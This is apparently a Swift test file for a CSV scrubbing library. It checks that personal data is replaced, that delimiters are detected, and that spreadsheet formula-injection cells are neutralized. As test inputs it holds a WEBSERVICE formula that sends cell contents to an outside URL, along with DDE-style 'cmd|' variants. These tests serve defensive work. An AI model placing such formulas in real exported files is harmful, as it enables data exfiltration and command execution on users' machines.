import Foundation
@testable import ScrubCore
import Testing

@Test func csvScrubsRowsAndReportsTable() throws {
    let input = "first_name,last_name,email,department\nRobert,Mitchell,rmitchell@acme.com,Finance\nAna,Pereira,ana.pereira@acme.com,Legal\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    #expect(result.format == "csv")
    #expect(!String(decoding: result.output, as: UTF8.self).contains("rmitchell@acme.com"))
    if case .table(let columns, let rows, let rowCount, let marks) = result.preview {
        #expect(columns == ["first_name", "last_name", "email", "department"])
        #expect(rowCount == 2)
        #expect(rows[0][3] == "Finance")
        #expect(!marks.isEmpty)
    } else { Issue.record("Expected table preview") }
}

/// A cell holding a body in base64 or as JSON is read inside, as a JSON string's is: each row's
/// body written again in its own form, one stand-in for one value, the row's other cells kept.
@Test(arguments: ["Pasted text", "a.csv"])
func csvCellsHoldingBodiesAreScrubbedInside(_ name: String) throws {
    let encoded = "eyJwYXNzd29yZCI6InF1aWxsaGFyYm9yIn0="
    let input = "id,payload,note\n1,\(encoded),\"{\"\"email\"\":\"\"a@example.org\"\",\"\"status\"\":\"\"ok\"\"}\"\n2,\(encoded),\"{\"\"email\"\":\"\"a@example.org\"\",\"\"status\"\":\"\"ok\"\"}\"\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: name, forceFullDetection: false, seed: 7)
    let output = String(decoding: result.output, as: UTF8.self)
    #expect(result.format == "csv")
    let rows = try CSVFile.parse(output, delimiter: ",")
    #expect(rows.count == 3 && rows.allSatisfy { $0.count == 3 }, "\(output)")
    guard rows.count == 3, rows.allSatisfy({ $0.count == 3 }) else { return }
    #expect(rows[1][0] == "1" && rows[2][0] == "2")
    #expect(rows[1][1] != encoded && rows[1][1] == rows[2][1], "\(output)")
    let decoded = try #require(Data(base64Encoded: rows[1][1]).flatMap { String(data: $0, encoding: .utf8) })
    #expect(decoded.hasPrefix(#"{"password":""#) && !decoded.contains("quillharbor"), "\(decoded)")
    let note = try #require(try JSONSerialization.jsonObject(with: Data(rows[1][2].utf8)) as? [String: String])
    #expect(note["status"] == "ok" && note["email"] != "a@example.org" && rows[1][2] == rows[2][2], "\(output)")
    if case .table(_, _, _, let marks) = result.preview {
        #expect(marks.contains { $0.row == 0 && $0.column == 1 } && marks.contains { $0.row == 1 && $0.column == 2 })
    } else { Issue.record("Expected table preview") }
    // Kept as written in the review, a value goes back into the bodies it came from, and only there.
    let email = try #require(result.findings.first { $0.original == "a@example.org" })
    let (choices, kept) = result.keeping([email], choices: result.choices, marks: result.marks)
    let after = try CSVFile.parse(String(decoding: try result.applying(choices, marks: kept).output, as: UTF8.self), delimiter: ",")
    #expect(after.count == 3 && after[1][2] == #"{"email":"a@example.org","status":"ok"}"# && after[2][2] == after[1][2] && after[1][1] == rows[1][1], "\(after)")
}

/// The reported case: two rows, one column of bodies in base64.
@Test func csvCellsInBase64AreScrubbed() throws {
    let input = "id,payload\n1,eyJwYXNzd29yZCI6InF1aWxsaGFyYm9yIn0=\n2,eyJwYXNzd29yZCI6InF1aWxsaGFyYm9yIn0=\n"
    let output = String(decoding: try Scrubber.scrub(Data(input.utf8), name: "Pasted text", forceFullDetection: false, seed: 7).output, as: UTF8.self)
    let rows = try CSVFile.parse(output, delimiter: ",")
    #expect(rows.count == 3 && rows[1][1] == rows[2][1] && !output.contains("eyJwYXNzd29yZCI6InF1aWxsaGFyYm9yIn0="), "\(output)")
}

/// A body in a row is that row's: its email follows the row's own person, never another row's.
@Test(arguments: [7, 11, 23] as [UInt64])
func csvCellBodiesFollowTheirOwnRow(_ seed: UInt64) throws {
    let input = "first_name,last_name,body\nAlice,Smith,\"{\"\"email\"\":\"\"first@example.org\"\"}\"\nBob,Jones,\"{\"\"email\"\":\"\"second@example.org\"\"}\"\n"
    let output = String(decoding: try Scrubber.scrub(Data(input.utf8), name: "a.csv", forceFullDetection: false, seed: seed).output, as: UTF8.self)
    let rows = try CSVFile.parse(output, delimiter: ",")
    #expect(rows.count == 3 && rows.allSatisfy { $0.count == 3 }, "\(output)")
    guard rows.count == 3, rows.allSatisfy({ $0.count == 3 }) else { return }
    let emails = try rows.dropFirst().map { row in
        try #require((try JSONSerialization.jsonObject(with: Data(row[2].utf8)) as? [String: String])?["email"]).lowercased()
    }
    #expect(emails[0] != emails[1], "\(output)")
    for (row, email) in zip(rows.dropFirst(), emails) {
        #expect(email.contains(row[1].lowercased()), "\(output)")
    }
}

@Test(arguments: ["\n=1+1", " =1+1", "\t=1+1", "＝1+1", "＠SUM(A1)", "＋cmd|x", "－cmd|x", "\r@SUM(A1)"])
func csvNeutralizesFormula(_ cell: String) {
    #expect(CSVFile.neutralize(cell) == "'" + cell)
}

@Test(arguments: ["-12.5", "+4", " +4", "+1 212 867 5309", "－12"])
func csvLeavesSignedNumber(_ cell: String) {
    #expect(CSVFile.neutralize(cell) == nil)
}

@Test func csvOutputPreservesLineTerminator() throws {
    let result = try Scrubber.scrub(Data("id,note\r\n1,=SUM(A1)\r\n".utf8), name: "a.csv")
    #expect(String(decoding: result.output, as: UTF8.self).contains("\r\n"))
    #expect(result.neutralized == 1)
}

@Test func csvFirstRowWithPatternsIsData() throws {
    let input = "1,Robert Mitchell,alice@example.com\n2,Ana Pereira,ana@example.org\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    #expect(String(decoding: result.output, as: UTF8.self).hasPrefix("1,"))
    if case .table(let columns, _, let rowCount, _) = result.preview {
        #expect(columns[0] == "column 1")
        #expect(rowCount == 2)
    } else { Issue.record("Expected table preview") }
}

@Test func csvHeaderCellsAreScanned() throws {
    let input = "month,alice@example.com,bob@example.org\njan,3,4\nfeb,5,6\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let output = String(decoding: result.output, as: UTF8.self)
    #expect(!output.contains("alice@example.com"))
    #expect(!output.contains("bob@example.org"))
}

@Test func csvFormulaInHeaderAndBareQuotes() throws {
    let input = "=WEBSERVICE(\"https://x.invalid/?r=\"&B2),name\n1,Robert Mitchell\n2,Ana Pereira\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let output = String(decoding: result.output, as: UTF8.self)
    #expect(try CSVFile.parse(output, delimiter: ",")[0][0].hasPrefix("'=WEBSERVICE("))
    #expect(result.neutralized == 1)
    #expect(!output.contains("Robert Mitchell"))
}

@Test func csvPreviewStopsAtFiveHundredRows() throws {
    let input = "id,notes\n" + (1...501).map { "\($0),plain" }.joined(separator: "\n") + "\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    if case .table(_, let rows, let rowCount, _) = result.preview {
        #expect(rows.count == 500)
        #expect(rowCount == 501)
    } else { Issue.record("Expected table preview") }
}

@Test(arguments: [",", ";", "\t", "|"])
func csvSniffsDelimiter(_ delimiter: String) throws {
    let input = "name\(delimiter)email\nRobert Mitchell\(delimiter)robert@example.com\nAna Pereira\(delimiter)ana@example.com\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    #expect(result.format == "csv")
    if case .table(let columns, let rows, _, _) = result.preview {
        #expect(columns == ["name", "email"])
        #expect(rows[0].count == 2)
    } else { Issue.record("Expected table preview") }
}

@Test func csvRowsAssociateNamesAndEmails() throws {
    let input = "first_name,last_name,email\nRobert,Mitchell,rmitchell@acme.com\nAna,Pereira,ana.pereira@acme.com\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let rows = try CSVFile.parse(String(decoding: result.output, as: UTF8.self), delimiter: ",")
    #expect(rows[1][2].hasPrefix("\(rows[1][0].prefix(1).lowercased())\(rows[1][1].lowercased())@"))
    #expect(rows[2][2].hasPrefix("\(rows[2][0].lowercased()).\(rows[2][1].lowercased())@"))
}

@Test func csvSniffsSingleQuotedDialect() throws {
    let input = "'name';'email'\n'Robert Mitchell';'robert@example.com'\n'Ana Pereira';'ana@example.com'\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let rows = try CSVFile.parse(String(decoding: result.output, as: UTF8.self), delimiter: ";", quoteCharacter: "'")
    #expect(rows[0] == ["name", "email"])
    #expect(rows[1][0] != "Robert Mitchell")
    #expect(rows[1][1] != "robert@example.com")
}

@Test func csvFormulaCellsRemainInertAfterWriting() throws {
    let input = "id,ref,phone,delta\n1,\"=WEBSERVICE(\"\"https://example.invalid/?r=\"\"&B2)\",+1 212 867 5309,-12.5\n2,@SUM(A1),n/a,+4\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let rows = try CSVFile.parse(String(decoding: result.output, as: UTF8.self), delimiter: ",")
    #expect(rows[1][1].hasPrefix("'=WEBSERVICE"))
    #expect(rows[2][1] == "'@SUM(A1)")
    #expect(rows[1][3] == "-12.5")
    #expect(rows[2][3] == "+4")
    #expect(!rows[1][2].hasPrefix("'"))
    #expect(result.neutralized == 2)
}

@Test(arguments: ["\n=1+1", " =1+1", "\t=1+1", "＝1+1", "＠SUM(A1)", "＋cmd|x", "－cmd|x", "\r@SUM(A1)"])
func csvFormulaVariantsRemainInertAfterWriting(_ cell: String) throws {
    let input = "id,note\n1,\"\(cell.replacingOccurrences(of: "\"", with: "\"\""))\"\n2,plain\n"
    let result = try Scrubber.scrub(Data(input.utf8), name: "a.csv")
    let rows = try CSVFile.parse(String(decoding: result.output, as: UTF8.self), delimiter: ",")
    #expect(rows[1][1] == "'" + cell)
    #expect(result.neutralized == 1)
}

/// A header of many columns is read in one pass: one object's fields, a form
/// field's name beside its value, and a bare "name" beside the rest are each
/// read once, never once per column.
enum WideHeaders {
    static func repeated(_ column: String, _ count: Int) -> String { Array(repeating: column, count: count).joined(separator: ",") }
    /// Each shape of header `count` columns wide.
    static func header(_ shape: String, _ count: Int) -> String {
        switch shape {
        case "distinct": return "email," + (0..<count).map { (index: Int) -> String in "r\(index).application.name" }.joined(separator: ",")
        case "nested": return "application.dob," + repeated("application.name", count)
        case "pairs": return repeated("fields.0.value,fields.0.name", count / 2)
        default: return "customer_id," + repeated("name", count)
        }
    }
}

@Test(arguments: ["distinct", "nested", "pairs", "flat"])
func csvReadsAWideHeaderInOnePass(_ shape: String) throws {
    func time(_ count: Int) throws -> Duration {
        // A short row, so the time is the header's alone.
        let text = WideHeaders.header(shape, count) + "\nJane Roe,1984-03-02\nAn Wu,1990-01-01\n"
        let clock = ContinuousClock()
        let started = clock.now
        let result = try Scrubber.scrub(Data(text.utf8), name: "wide.csv", forceFullDetection: false, seed: 9)
        #expect(result.format == "csv")
        return clock.now - started
    }
    let narrow = try time(5_000), wide = try time(20_000)
    // Read once per column, four times the columns take about four times as long;
    // once per pair of columns, sixteen. A ratio holds on a busy machine where a time would not.
    #expect(wide < narrow * 8 + .seconds(2), "\(shape): \(narrow) then \(wide)")
}
